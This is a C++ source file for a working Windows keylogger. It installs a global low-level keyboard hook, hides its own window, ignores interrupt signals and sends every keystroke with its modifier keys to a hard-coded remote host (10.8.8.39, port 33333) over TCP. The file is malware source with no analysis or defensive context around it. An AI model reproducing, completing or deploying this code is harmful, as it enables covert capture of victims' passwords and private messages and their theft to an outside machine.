#include "winsock2.h"
#include <Windows.h>
#include <cstdio>
#include <string>
#include <csignal>
#include <iostream>
#include <cstdlib>
#pragma region Key Listen Core
#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1 : 0)
#define VKCode int
using std::cerr;
using std::cin;
using std::cout;
using std::endl;
using std::getline;
using std::string;
struct FinishProgram
{
};
struct NoSuchKeyError
{
    int vkcode;
    NoSuchKeyError(const int &vk) : vkcode(vk) {}
};
void createServer(SOCKET *);
void printKey(string);
void quit(int);
inline string vk2str(VKCode);
void sendData(string);
LRESULT CALLBACK KeyboardProc(int, WPARAM, LPARAM);
bool lsh = false,
     rsh = false,
     lal = false,
     ral = false,
     lct = false,
     rct = false,
     app = false,
     win = false;
const int PORT = 33333;
const string IP = "10.8.8.39";
HHOOK keyboardHook;
int main()
{
    signal(SIGINT, SIG_IGN);
    signal(SIGBREAK, SIG_IGN);

#pragma region Network initialisation
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#pragma endregion Network initialisation
    HWND wnd = GetForegroundWindow();
#ifndef console
    freopen("config", "r", stdin);
    string s;
    getline(cin, s);
    freopen(s.c_str(), "w", stdout);
#endif
#ifdef debug
    string text = "Output to: ";
#ifdef console
    text += "console";
#else
    text += s;
#endif
    MessageBoxA(NULL, text.c_str(), "Info", MB_ICONINFORMATION | MB_OK);
#else
    ShowWindow(wnd, 0); // hide window
#endif
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook)
        MessageBoxA(NULL, "Failed to load hook.", "Fatal Error", MB_ICONERROR | MB_OKCANCEL);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    WSACleanup();
    return (int)msg.wParam;
}
inline string vk2str(VKCode vk)
{
    switch (vk)
    {
    case 91:
        return "[win]";
    case 93:
        return "[rclickmenu]";
    case 0x08:
        return "[backspace]";
    case 0x09:
        return "[tab]";
    case 0x0C:
        return "[clear]";
    case 0x0D:
        return "[enter]";
    case 0x10:
        return "[shift]";
    case 0x11:
        return "[ctrl]";
    case 0x12:
        return "[alt]";
    case 0x13:
        return "[pause]";
    case 0x14:
        return "[capslock]";
    case 0x1B:
        return "[esc]";
    case 0x20:
        return "[space]";
    case 0x21:
        return "[page_up]";
    case 0x22:
        return "[page_down]";
    case 0x23:
        throw FinishProgram();
        return "[end]";
    case 0x24:
        return "[home]";
    case 0x25:
        return "[leftarrow]";
    case 0x26:
        return "[uparrow]";
    case 0x27:
        return "[rightarrow]";
    case 0x28:
        return "[downarrow]";
    case 0x29:
        return "[select]";
    case 0x2A:
        return "[print]";
    case 0x2B:
        return "[execute]";
    case 0x2C:
        return "[printscreen]";
    case 0x2D:
        return "[ins]";
    case 0x2E:
        return "[del]";
    case 0x2F:
        return "[help]";
    case 0x30:
        return "0";
    case 0x31:
        return "1";
    case 0x32:
        return "2";
    case 0x33:
        return "3";
    case 0x34:
        return "4";
    case 0x35:
        return "5";
    case 0x36:
        return "6";
    case 0x37:
        return "7";
    case 0x38:
        return "8";
    case 0x39:
        return "9";
    case 0x41:
        return "a";
    case 0x42:
        return "b";
    case 0x43:
        return "c";
    case 0x44:
        return "d";
    case 0x45:
        return "e";
    case 0x46:
        return "f";
    case 0x47:
        return "g";
    case 0x48:
        return "h";
    case 0x49:
        return "i";
    case 0x4A:
        return "j";
    case 0x4B:
        return "k";
    case 0x4C:
        return "l";
    case 0x4D:
        return "m";
    case 0x4E:
        return "n";
    case 0x4F:
        return "o";
    case 0x50:
        return "p";
    case 0x51:
        return "q";
    case 0x52:
        return "r";
    case 0x53:
        return "s";
    case 0x54:
        return "t";
    case 0x55:
        return "u";
    case 0x56:
        return "v";
    case 0x57:
        return "w";
    case 0x58:
        return "x";
    case 0x59:
        return "y";
    case 0x5A:
        return "z";
    case 0x60:
        return "0";
    case 0x61:
        return "np1";
    case 0x62:
        return "np2";
    case 0x63:
        return "np3";
    case 0x64:
        return "np4";
    case 0x65:
        return "np5";
    case 0x66:
        return "np6";
    case 0x67:
        return "np7";
    case 0x68:
        return "np8";
    case 0x69:
        return "np9";
    case 0x6A:
        return "np*";
    case 0x6B:
        return "np+";
    case 0x6C:
        return "separator_key";
    case 0x6D:
        return "np-";
    case 0x6E:
        return "np.";
    case 0x6F:
        return "np/";
    case 0x70:
        return "[F1]";
    case 0x71:
        return "[F2]";
    case 0x72:
        return "[F3]";
    case 0x73:
        return "[F4]";
    case 0x74:
        return "[F5]";
    case 0x75:
        return "[F6]";
    case 0x76:
        return "[F7]";
    case 0x77:
        return "[F8]";
    case 0x78:
        return "[F9]";
    case 0x79:
        return "[F10]";
    case 0x7A:
        return "[F11]";
    case 0x7B:
        return "[F12]";
    case 0x7C:
        return "[F13]";
    case 0x7D:
        return "[F14]";
    case 0x7E:
        return "[F15]";
    case 0x7F:
        return "[F16]";
    case 0x80:
        return "[F17]";
    case 0x81:
        return "[F18]";
    case 0x82:
        return "[F19]";
    case 0x83:
        return "[F20]";
    case 0x84:
        return "[F21]";
    case 0x85:
        return "[F22]";
    case 0x86:
        return "[F23]";
    case 0x87:
        return "[F24]";
    case 0x90:
        return "[num_lock]";
    case 0x91:
        return "[scroll_lock]";
    case 0xA0:
        return "[LShift]";
    case 0xA1:
        return "[RShift]";
    case 0xA2:
        return "[LCtrl]";
    case 0xA3:
        return "[RCtrl]";
    case 0xA4:
        return "[LAlt]";
    case 0xA5:
        return "[RAlt]";
    case 0xA6:
        return "browser_back";
    case 0xA7:
        return "browser_forward";
    case 0xA8:
        return "browser_refresh";
    case 0xA9:
        return "browser_stop";
    case 0xAA:
        return "browser_search";
    case 0xAB:
        return "browser_favorites";
    case 0xAC:
        return "browser_start_and_home";
    case 0xAD:
        return "volume_mute";
    case 0xAE:
        return "volume_Down";
    case 0xAF:
        return "volume_up";
    case 0xB0:
        return "next_track";
    case 0xB1:
        return "previous_track";
    case 0xB2:
        return "stop_media";
    case 0xB3:
        return "play/pause_media";
    case 0xB4:
        return "start_mail";
    case 0xB5:
        return "select_media";
    case 0xB6:
        return "start_application_1";
    case 0xB7:
        return "start_application_2";
    case 0xF6:
        return "attn_key";
    case 0xF7:
        return "crsel_key";
    case 0xF8:
        return "exsel_key";
    case 0xFA:
        return "play_key";
    case 0xFB:
        return "zoom_key";
    case 0xFE:
        return "clear_key";
    case 0xBB:
        return "+";
    case 0xBC:
        return ",";
    case 0xBD:
        return "-";
    case 0xBE:
        return ".";
    case 0xBF:
        return "/";
    case 0xC0:
        return "`";
    case 0xBA:
        return ";";
    case 0xDB:
        return "[";
    case 0xDC:
        return "\\";
    case 0xDD:
        return "]";
    case 0xDE:
        return "\'";
    default:
        throw NoSuchKeyError(vk);
        return "";
    }
}
void printKey(string s)
{
    string res = "";
    if (lsh)
        res += "[LShift]+";
    if (rsh)
        res += "[RShift]+";
    if (lal)
        res += "[LAlt]+";
    if (ral)
        res += "[RAlt]+";
    if (win)
        res += "[win]+";
    if (app)
        res += "[app]+";
    if (lct)
        res += "[LCtrl]+";
    if (rct)
        res += "[RCtrl]+";
    res += s + " ";
    sendData(res);
    // printf("%s", res.c_str());
}
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wp, LPARAM lp)
{
    if (nCode < 0)
        return CallNextHookEx(keyboardHook, nCode, wp, lp);
    try
    {
        int vkcode = ((KBDLLHOOKSTRUCT *)lp)->vkCode;
        bool isUp = wp & 1;
        if (!isUp)
        {
            switch (vkcode)
            {
            case VK_LSHIFT:
                lsh = true;
                break;
            case VK_RSHIFT:
                rsh = true;
                break;
            case VK_LCONTROL:
                lct = true;
                break;
            case VK_RCONTROL:
                rct = true;
                break;
            case VK_LMENU:
                lal = true;
                break;
            case VK_RMENU:
                ral = true;
                break;
            case VK_APPS:
                app = true;
                break;
            case VK_LWIN:
                win = true;
                break;
            default:
                printKey(vk2str(vkcode));
            }
        }
        else
        {
            switch (vkcode)
            {
            case VK_LSHIFT:
                lsh = false;
                break;
            case VK_RSHIFT:
                rsh = false;
                break;
            case VK_LCONTROL:
                lct = false;
                break;
            case VK_RCONTROL:
                rct = false;
                break;
            case VK_LMENU:
                lal = false;
                break;
            case VK_RMENU:
                ral = false;
                break;
            case VK_APPS:
                app = false;
                break;
            case VK_LWIN:
                win = false;
                break;
            }
        }
    }
    catch (NoSuchKeyError e)
    {
        cerr << "Fatal. No such vk_code. vk_code: " << e.vkcode << endl;
        cout << "\n[Fatal. No suck vk_code. vkcode: " << e.vkcode << endl;
    }
    catch (FinishProgram _)
    {
        quit(0);
    }
    return CallNextHookEx(keyboardHook, nCode, wp, lp);
}
void quit(int ret)
{
    sendData("[end]");
    PostQuitMessage(ret);
}
#pragma endregion Key Listen Core
#pragma region Network module
void sendData(string res)
{
    SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr("10.8.8.39");
    int result = connect(client, (SOCKADDR *)&serverAddr, sizeof(serverAddr));
    if (result)
    {
        sendData(res);
        return;
    }
    send(client, res.c_str(), res.size() + 1, 0);
}
#pragma endregion Network module